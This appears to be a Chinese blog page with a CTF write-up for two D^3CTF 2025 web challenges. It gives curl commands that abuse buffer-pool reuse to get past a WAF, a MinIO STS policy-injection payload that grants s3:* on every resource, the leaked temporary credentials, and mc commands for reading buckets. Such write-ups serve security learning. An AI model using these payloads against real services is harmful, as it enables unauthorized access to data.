@@ -1,0 +1,1153 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="D^3ctf, Hexo">
+    <meta name="description" content="https://mp.weixin.qq.com/s?__biz=MzkwMDY2ODc0MA==&amp;amp;mid=2247485533&amp;amp;idx=1&amp;amp;sn=7b68ffc7dcc430326e32ec1517579cda&amp;a">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>D^3ctf | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">D^3ctf</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-05-18
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-08-25
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    16 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkwMDY2ODc0MA==&amp;mid=2247485533&amp;idx=1&amp;sn=7b68ffc7dcc430326e32ec1517579cda&amp;chksm=c1d6e196c4689093adb5540ddf824ca7fc830b02a03599d3b20f10b17b745ce02f3eb11b4b58&amp;mpshare=1&amp;scene=23&amp;srcid=0602Akfw1aD2LnXVrzQQipJn&amp;sharer_shareinfo=97ea989882b93a4bce2a3b5ece51d8d7&amp;sharer_shareinfo_first=a66f1421f98917552497cf380ea9e98b#rd">https://mp.weixin.qq.com/s?__biz=MzkwMDY2ODc0MA==&amp;mid=2247485533&amp;idx=1&amp;sn=7b68ffc7dcc430326e32ec1517579cda&amp;chksm=c1d6e196c4689093adb5540ddf824ca7fc830b02a03599d3b20f10b17b745ce02f3eb11b4b58&amp;mpshare=1&amp;scene=23&amp;srcid=0602Akfw1aD2LnXVrzQQipJn&amp;sharer_shareinfo=97ea989882b93a4bce2a3b5ece51d8d7&amp;sharer_shareinfo_first=a66f1421f98917552497cf380ea9e98b#rd</a></p>
+<p><a href="file:///D:/Downloads/D3CTF-2025-Official-Writeup-CN.pdf">D3CTF-2025-Official-Writeup-CN.pdf</a></p>
+<h3 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a>tidy quic</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	"bytes"</span><br><span class="line">	"errors"</span><br><span class="line">	"github.com/libp2p/go-buffer-pool"</span><br><span class="line">	"github.com/quic-go/quic-go/http3"</span><br><span class="line">	"io"</span><br><span class="line">	"log"</span><br><span class="line">	"net/http"</span><br><span class="line">	"os"</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var p pool.BufferPool</span><br><span class="line">var ErrWAF = errors.New("WAF")</span><br><span class="line"></span><br><span class="line">func main() {</span><br><span class="line">	go func() {</span><br><span class="line">		err := http.ListenAndServeTLS(":8080", "./server.crt", "./server.key", &amp;mux{})</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	}()</span><br><span class="line">	go func() {</span><br><span class="line">		err := http3.ListenAndServeQUIC(":8080", "./server.crt", "./server.key", &amp;mux{})</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	}()</span><br><span class="line">	select {}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">type mux struct {</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (*mux) ServeHTTP(w http.ResponseWriter, r *http.Request) {</span><br><span class="line">	if r.Method == http.MethodGet {</span><br><span class="line">		_, _ = w.Write([]byte("Hello D^3CTF 2025,I'm tidy quic in web."))</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line">	if r.Method != http.MethodPost {</span><br><span class="line">		w.WriteHeader(400)</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	var buf []byte</span><br><span class="line">	length := int(r.ContentLength)</span><br><span class="line">	if length == -1 {</span><br><span class="line">		var err error</span><br><span class="line">		buf, err = io.ReadAll(textInterrupterWrap(r.Body))</span><br><span class="line">		if err != nil {</span><br><span class="line">			if errors.Is(err, ErrWAF) {</span><br><span class="line">				w.WriteHeader(400)</span><br><span class="line">				_, _ = w.Write([]byte("WAF"))</span><br><span class="line">			} else {</span><br><span class="line">				w.WriteHeader(500)</span><br><span class="line">				_, _ = w.Write([]byte("error"))</span><br><span class="line">			}</span><br><span class="line">			return</span><br><span class="line">		}</span><br><span class="line">	} else {</span><br><span class="line">		buf = p.Get(length)</span><br><span class="line">		defer p.Put(buf)</span><br><span class="line">		rd := textInterrupterWrap(r.Body)</span><br><span class="line">		i := 0</span><br><span class="line">		for {</span><br><span class="line">			n, err := rd.Read(buf[i:])</span><br><span class="line">			if err != nil {</span><br><span class="line">				if errors.Is(err, io.EOF) {</span><br><span class="line">					break</span><br><span class="line">				} else if errors.Is(err, ErrWAF) {</span><br><span class="line">					w.WriteHeader(400)</span><br><span class="line">					_, _ = w.Write([]byte("WAF"))</span><br><span class="line">					return</span><br><span class="line">				} else {</span><br><span class="line">					w.WriteHeader(500)</span><br><span class="line">					_, _ = w.Write([]byte("error"))</span><br><span class="line">					return</span><br><span class="line">				}</span><br><span class="line">			}</span><br><span class="line">			i += n</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	if !bytes.HasPrefix(buf, []byte("I want")) {</span><br><span class="line">		_, _ = w.Write([]byte("Sorry I'm not clear what you want."))</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line">	item := bytes.TrimSpace(bytes.TrimPrefix(buf, []byte("I want")))</span><br><span class="line">	if bytes.Equal(item, []byte("flag")) {</span><br><span class="line">		_, _ = w.Write([]byte(os.Getenv("FLAG")))</span><br><span class="line">	} else {</span><br><span class="line">		_, _ = w.Write(item)</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">type wrap struct {</span><br><span class="line">	io.ReadCloser</span><br><span class="line">	ban []byte</span><br><span class="line">	idx int</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (w *wrap) Read(p []byte) (int, error) {</span><br><span class="line">	n, err := w.ReadCloser.Read(p)</span><br><span class="line">	if err != nil &amp;&amp; !errors.Is(err, io.EOF) {</span><br><span class="line">		return n, err</span><br><span class="line">	}</span><br><span class="line">	for i := 0; i &lt; n; i++ {</span><br><span class="line">		if p[i] == w.ban[w.idx] {</span><br><span class="line">			w.idx++</span><br><span class="line">			if w.idx == len(w.ban) {</span><br><span class="line">				return n, ErrWAF</span><br><span class="line">			}</span><br><span class="line">		} else {</span><br><span class="line">			w.idx = 0</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	return n, err</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func textInterrupterWrap(rc io.ReadCloser) io.ReadCloser {</span><br><span class="line">	return &amp;wrap{</span><br><span class="line">		rc, []byte("flag"), 0,</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<ul>
+<li>HTTP/3 要求使用 HTTPS（TLS 加密）</li>
+<li>只有 HTTPS 才能启用 HTTP/3 协议</li>
+<li>HTTP/3 默认使用 QUIC 协议，而 QUIC 协议底层已经基于 UDP</li>
+</ul>
+</blockquote>
+<p>buf缓存复用，用完缓存后没有清除而是放进了公共池，然后是根据请求长度来获取缓存</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">item := bytes.TrimSpace(bytes.TrimPrefix(buf, []byte("I want")))</span><br><span class="line">	if bytes.Equal(item, []byte("flag")) {</span><br><span class="line">	</span><br><span class="line">	buf = p.Get(length)</span><br><span class="line">		defer p.Put(buf)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以通过设置 Content-Length 来填充上次请求的buf缓存内容，然后检测waf是检测的请求内容，获取flag是看的buf，从而进行绕过</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl --http3 -k -v https://35.241.98.126:30830   Hello D^3CTF 2025,I'm tidy quic in web. </span><br><span class="line">curl --http3 -k -v -X POST https://35.241.98.126:30830      Sorry I'm not clear what you want. </span><br><span class="line">curl --http3 -k -v -X POST https://35.241.98.126:30830 -d "I want flag"   WAF  </span><br><span class="line">curl --http3 -k -v -X POST https://35.241.98.126:30830 -d 'I want \0flag'</span><br><span class="line"></span><br><span class="line">x=$'I want   ag'</span><br><span class="line">curl -X POST https://35.241.98.126:30830 -d "$x" -v --insecure --http3 -H "Content-Length: 11" </span><br><span class="line">x=$'I want fl  '</span><br><span class="line">curl -X POST https://35.241.98.126:30830 -d "$x" -v --insecure --http3 -H "Content-Length: 11" </span><br><span class="line"></span><br><span class="line">curl -k --http3 -X POST https://35.241.98.126:31100 --data "I want" -H "Content-Length: 11"</span><br><span class="line">curl -k --http3 -X POST https://35.241.98.126:31100 --data "I want flag" -H "Content-Length: 11"</span><br><span class="line">curl -k --http3 -X POST https://35.241.98.126:31100 --data "I want" -H "Content-Length: 11"</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h3 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h3><p><a target="_blank" rel="noopener" href="https://stevenocean.github.io/2021/01/12/minio-sts-assumerole-sample.html">https://stevenocean.github.io/2021/01/12/minio-sts-assumerole-sample.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4340">https://forum.butian.net/share/4340</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  "access_key_id": "GGQAD3S7AQV2CHW6FIWK",</span><br><span class="line">  "secret_access_key": "dUBCb6NEb+SQ++eaOxHLqf7nuf+5sq2Hnb+BFszW",</span><br><span class="line">  "session_token": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJHR1FBRDNTN0FRVjJDSFc2RklXSyIsImV4cCI6MTc0ODcwMzMwMiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2TWk1cWNHY2lYWDFkZlE9PSJ9.e5_4cry-b2AEx8W4BHStRMe_XLmPNHN1V_T06lEKhRJ_D5kLPHlbahY7-5oYiUzV0-DeHCyXxAfFRN5XXq7DpA"</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">{"alg":"HS512","typ":"JWT"}.{"accessKey":"GGQAD3S7AQV2CHW6FIWK","exp":1748703302,"parent":"B9M320QXHD38WUR2MIY3","sessionPolicy":"eyJWZXJzaW9uIjoiMjAxMi0xMC0xNyIsIlN0YXRlbWVudCI6W3siRWZmZWN0IjoiQWxsb3ciLCJBY3Rpb24iOlsiczM6R2V0T2JqZWN0IiwiczM6UHV0T2JqZWN0Il0sIlJlc291cmNlIjpbImFybjphd3M6czM6OjpkM2ludml0YXRpb24vMi5qcGciXX1dfQ=="}.e5_4cry-b2AEx8W4BHStRMe_XLmPNHN1V_T06lEKhRJ_D5kLPHlbahY7-5oYiUzV0-DeHCyXxAfFRN5XXq7DpA</span><br><span class="line"></span><br><span class="line">{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject","s3:PutObject"],"Resource":["arn:aws:s3:::d3invitation/2.jpg"]}]}</span><br><span class="line"></span><br><span class="line">{"object_name":"*\",\"arn:aws:s3:::*"}</span><br><span class="line">{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject","s3:PutObject"],"Resource":["arn:aws:s3:::*","arn:aws:s3:::d3invitation/*"]}]}</span><br><span class="line"></span><br><span class="line">可以尝试构造一个特殊的object_name对policy进行注入，拿到一个对MinIO拥有所有权限的STS临时凭证</span><br><span class="line">{"object_name":"*\"]},{\"Effect\":\"Allow\",\"Action\":[\"s3:*\"],\"Resource\":[\"arn:aws:s3:::*"} </span><br><span class="line">"access_key_id":"NPO9XN9GE4MITLK9WCBB","secret_access_key":"KYOdEREHpVOnP2FCkxRn33vGL3azYoSyAUfY+U6R","session_token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJOUE85WE45R0U0TUlUTEs5V0NCQiIsImV4cCI6MTc0ODg3NDgxNiwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2lvaVhTd2lVbVZ6YjNWeVkyVWlPbHNpWVhKdU9tRjNjenB6TXpvNk9pb2lYWDFkZlE9PSJ9.UVopT0BZzvHVLUIIofPpaPrBSEgf7U75ZHxAG_dr-iZXORS5fs8FvE6QZWqpBvC28E_VyIHGIrbC8TztFmJoMQ"</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.min.io/client/mc/release/linux-amd64/mc</span><br><span class="line">chmod +x mc</span><br><span class="line">sudo mv mc /usr/local/bin/</span><br><span class="line"></span><br><span class="line">export MC_HOST_youralias="http://yourserveraddress:9000 youraccesskey yoursecretkey"</span><br><span class="line">mc ls youralias</span><br><span class="line">mc ls youralias/yourbucketname</span><br><span class="line">mc cat youralias/yourbucketname/yourobjectname</span><br></pre></td></tr></tbody></table></figure></blockquote>
